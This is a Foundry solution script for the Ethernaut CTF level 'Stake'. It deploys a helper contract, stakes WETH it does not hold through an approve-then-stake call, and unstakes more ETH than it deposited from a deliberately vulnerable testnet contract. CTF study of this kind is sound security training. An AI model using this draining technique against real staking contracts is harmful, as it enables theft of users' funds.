// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/Stake.sol";

/*
    Solution script for the Ethernaut Level 31: Stake

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in StakeScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/Stake.s.sol:StakeScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        --evm-version cancun \
        --priority-gas-price 1 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/Stake.s.sol/11155111
*/

interface IWETH {
    function approve(address spender, uint256 amount) external returns (bool);
}

// source: https://blog.pedrojok.com/the-ethernaut-ctf-solutions-31-stake

contract BecauseWhyNot {
    Stake target;

    constructor(address _target) payable {
        target = Stake(_target);
    }

    function becauseWhyNot() external payable {
        // Become a staker with 0.001 ETH + 2 wei (1 will be left behind)
        target.StakeETH{value: msg.value}();
    }
}

contract StakeScript is Script {
    // replace instance with your level1 instance adddress
    address instance = 0x95ccEc07bA23AEc6D55D9bBf82CA211D5EA03306;
    // Replace with your Stake instance
    Stake level31 = Stake(instance);
    // get the weth contract instance
    IWETH weth = IWETH(level31.WETH());
    uint256 amount = 0.001 ether + 1 wei;

    function run() external {
        vm.startBroadcast();

        // 1. Deploy the BecauseWhyNot contract and stake some ETH
        BecauseWhyNot becauseWhyNot = new BecauseWhyNot(instance);
        becauseWhyNot.becauseWhyNot{value: amount + 1 wei}();

        // 2. Become a staker
        level31.StakeETH{value: amount}();

        // 3. Approve the stake contract to use WETH
        weth.approve(instance, amount);

        // 4. Stake WETH (that we don't have!)
        level31.StakeWETH(amount);
        // console.log("Balance after StakeWETH: ", instance.balance);
        // console.log("TotalStaked after StakeWETH: ", level31.totalStaked());

        // 5. Unstake ETH + WETH (leave 1 wei in Stake contract)
        level31.Unstake(amount * 2);
        // console.log("Balance after hack: ", instance.balance);
        // console.log("TotalStaked after hack: ", level31.totalStaked());
        // console.log("level31.UserStake(msg.sender) ", level31.UserStake(msg.sender));

         /*
            Check we have met the challenge requirements:

            * The Stake contract's balance has to be greater than 0.
            * The totalStaked amount must be greater than the contract's balance.
            * We must be a staker.
            * Our staked balance must be 0.
        */
        require(instance.balance > 0, "Stake balance == 0");
        require(
            level31.totalStaked() > instance.balance,
            "Balance > Total staked"
        );
        require(level31.Stakers(msg.sender), "player is not a staker");
        // require(level31.UserStake(msg.sender) == 0, 'player staked balance is not zero');

        vm.stopBroadcast();
    }
}